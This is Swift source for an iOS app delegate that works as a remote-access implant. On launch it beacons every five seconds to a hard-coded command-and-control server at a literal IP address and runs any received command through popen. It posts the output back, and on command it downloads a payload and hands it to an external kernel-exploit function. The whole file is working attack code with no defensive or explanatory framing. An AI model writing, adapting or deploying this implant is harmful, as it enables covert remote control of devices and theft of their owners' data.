import UIKit
import Foundation
import Darwin

@_silgen_name("fire_kernel_exploit")
func fire_kernel_exploit(_ payload_data: UnsafePointer<UInt8>, _ payload_size: Int)

@main
class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?
    let c2Server = "http://212.80.205.63:8782" 
    let beaconInterval: TimeInterval = 5.0

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        DispatchQueue.global(qos: .background).async { self.startBeacon() }
        return true
    }

    func startBeacon() {
        Timer.scheduledTimer(withTimeInterval: beaconInterval, repeats: true) { _ in self.fetchTask() }
        RunLoop.current.run()
    }

    func fetchTask() {
        guard let url = URL(string: "\(c2Server)/task") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data, error == nil else { return }
            if let cmd = String(data: data, encoding: .utf8), !cmd.isEmpty, cmd != "WAIT" {
                if cmd == "FIRE_EXPLOIT" {
                    self.fetchAndFireExploit()
                } else {
                    let output = self.executeCommand(cmd: cmd)
                    self.sendResult(output: output)
                }
            }
        }
        task.resume()
    }

    func fetchAndFireExploit() {
        guard let url = URL(string: "\(c2Server)/get_exploit") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let payloadData = data, error == nil else { return }
            if payloadData.count > 100 {
                payloadData.withUnsafeBytes { (pointer: UnsafeRawBufferPointer) in
                    if let baseAddress = pointer.baseAddress {
                        let uint8Pointer = baseAddress.assumingMemoryBound(to: UInt8.self)
                        fire_kernel_exploit(uint8Pointer, payloadData.count)
                    }
                }
                self.sendResult(output: "[+] Exploit fired in memory.")
            }
        }
        task.resume()
    }

    func executeCommand(cmd: String) -> String {
        var output = ""
        let task = popen(cmd, "r")
        if task == nil { return "Error: Failed to execute command." }
        var buffer = [CChar](repeating: 0, count: 512)
        while fgets(&buffer, Int32(buffer.count), task) != nil {
            output += String(cString: buffer)
        }
        pclose(task)
        return output.isEmpty ? "Command executed successfully (no output)." : output
    }

    func sendResult(output: String) {
        guard let url = URL(string: "\(c2Server)/result") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("text/plain", forHTTPHeaderField: "Content-Type")
        request.httpBody = output.data(using: .utf8)
        URLSession.shared.dataTask(with: request).resume()
    }
}
